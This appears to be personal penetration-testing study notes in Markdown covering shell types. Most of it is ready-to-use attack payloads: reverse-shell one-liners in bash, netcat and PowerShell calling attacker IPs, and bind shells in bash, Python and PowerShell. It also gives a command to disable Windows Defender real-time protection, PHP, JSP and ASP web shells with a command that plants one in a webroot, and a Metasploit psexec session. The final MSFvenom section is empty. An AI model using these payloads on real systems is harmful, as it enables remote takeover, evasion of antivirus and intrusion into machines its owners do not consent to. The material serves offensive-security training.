## Anatomy of shell

*Every operating system has a shell, and to interact with it, we must use an application known as a terminal emulator.When we discuss command-line interfaces, we know it is a combination of the operating system, terminal emulator application, and the command language interpreter.  Here are some of the most common terminal emulators:*
| **Terminal Emulator**                                          | **Operating System**     |
| -------------------------------------------------------------- | ------------------------ |
| [Windows Terminal](https://github.com/microsoft/terminal)      | Windows                  |
| [cmder](https://cmder.app)                                     | Windows                  |
| [PuTTY](https://www.putty.org)                                 | Windows                  |
| [kitty](https://sw.kovidgoyal.net/kitty/)                      | Windows, Linux and MacOS |
| [Alacritty](https://github.com/alacritty/alacritty)            | Windows, Linux and MacOS |
| [xterm](https://invisible-island.net/xterm/)                   | Linux                    |
| [GNOME Terminal](https://en.wikipedia.org/wiki/GNOME_Terminal) | Linux                    |
| [MATE Terminal](https://github.com/mate-desktop/mate-terminal) | Linux                    |
| [Konsole](https://konsole.kde.org)                             | Linux                    |
| [Terminal](https://en.wikipedia.org/wiki/Terminal_(macOS))     | MacOS                    |
| [iTerm2](https://iterm2.com)                                   | MacOS                    |

```
sasa@example$ ps ; env
```
[Command and Scripting Interpreter ](https://attack.mitre.org/techniques/T1059/)

## REVERSE Shell 
#### The remote/attacker machine initiates the connection and sends a request to connect to the target machine
[Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

*nc -lvnp 1234\
-l 	Listen mode, to wait for a connection to connect to us.\
-v 	Verbose mode, so that we know when we receive a connection.\
-n 	Disable DNS resolution and only connect from/to IPs, to speed up the connection.*

##### Bash:
```
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
##### Powershell:
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
##### Powershell One-liner
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
**powershell -nop -c**  = Executes powershell.exe with no profile (nop) and executes the command/script block (-c) contained in the quotes\
**"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);**  = Binding A Socket = Sets/evaluates the variable $client equal to (=) the New-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object\
**$stream = $client.GetStream();**  = Sets/evaluates the variable $stream equal to (=) the $client variable and the .NET framework method called GetStream that facilitates network communications.\
**[byte[]]$bytes = 0..65535|%{0};**  =  Empty Byte Stream\
**while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)**   =  Starts a while loop containing the $i variable set equal to (=) the .NET framework Stream.Read ($stream.Read) method. The parameters: buffer ($bytes), offset (0), and count ($bytes.Length) are defined inside the parentheses of the method\
**{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);**  =  Sets/evaluates the variable $data equal to (=) an ASCII encoding .NET framework class that will be used in conjunction with the GetString method to encode the byte stream ($bytes) into ASCII \
**$sendback = (iex $data 2>&1 | Out-String );**    =  Sets/evaluates the variable $sendback equal to (=) the Invoke-Expression (iex) cmdlet against the $data variable, then redirects the standard error (2>) & standard output (1) through a pipe (|) to the Out-String cmdlet which converts input objects into strings \
**$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';**   =  Sets/evaluates the variable $sendback2 equal to (=) the $sendback variable plus (+) the string PS ('PS') plus + path to the working directory ((pwd).path) plus (+) the string '> '. This will result in the shell prompt being PS C:\workingdirectoryofmachine > \
**$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}**   = Sets/evaluates the variable $sendbyte equal to (=) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box\
**$client.Close()"**  = Terminate TCP Connection\

[One-liner ecample-Nishang project](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

*It is possible to get error since Windows Defender AV software stopped execution of that code. In that case lets try disable AV on client/target windows machine*

```
Set-MpPreference -DisableRealtimeMonitoring $true
```
*and now we can execute:*
```
sudo nc -lvnp 443
```

---

## BIND Shell 
#### the target/victim machine listens for incoming connections and provides a shell interface when a connection is established
##### Bash:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```
##### Netcat/Bash Reverse Shell One-liner
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f  ; client: nc -nv 10.129.41.200 7777
```
**rm -f /tmp/f;**  =  Removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files. The semi-colon (;) is used to execute the command sequentially\
**mkfifo /tmp/f;**  = Make A Named Pipe - Makes a FIFO named pipe file at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (;) is used to execute the command sequentially\
**cat /tmp/f |**    = Output Redirection - Concatenates the FIFO named pipe file /tmp/f, the pipe (|) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (|)\
**/bin/bash -i 2>&1 |**  =  Specifies the command language interpreter using the -i option to ensure the shell is interactive. 2>&1 ensures the standard error data stream (2) & standard output data stream (1) are redirected to the command following the pipe (|)\
**nc 10.10.14.12 7777 > /tmp/f**   = Uses Netcat to send a connection to our attack host 10.10.14.12 listening on port 7777. The output will be redirected (>) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed

##### Python:
```
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
##### Powershell:
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```
1. Once we execute the bind shell command, we should have a shell waiting for us on the specified port. We can now connect to it.
2. nc 10.10.10.1 1234

##### Upgrading TTY:
1. python -c 'import pty; pty.spawn("/bin/bash")'
2. After we run this command, we will hit ctrl+z to background our shell and get back on our local terminal
```
www-data@remotehost$ ^Z

stty raw -echo
fg
[Enter]
www-data@remotehost$
```

*We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:*
```
sasa7@htb[/user]$ echo $TERM
xterm-256color

sasa7@htb[/user]$ stty size
67 318
```
---

## Web Shell

##### Code: php
```
<?php system($_REQUEST["cmd"]); ?>
``` 
```
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php AND THEN IN BROWSER: http://SERVER_IP:PORT/shell.php?cmd=id
```
##### Code: jsp
```
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```   
##### Code: asp
```
<% eval request("cmd") %>
```

```
The following are the default webroots for common web servers:
Apache 	/var/www/html/
Nginx 	/usr/local/nginx/html/
IIS 	c:\inetpub\wwwroot\
XAMPP 	C:\xampp\htdocs\
```

## Automatic Payloads with Metasploit
```
sudo msfconsole
search smb  ==> 56 exploit/windows/smb/psexec
use 56
options
?
set RHOSTS 10.129.180.71
set SHARE ADMIN$
set SMBPass blabla!
set SMBUser student
set LHOST 10.10.14.222
exploit
```

### Crafting Payloads with MSFvenom
```

```
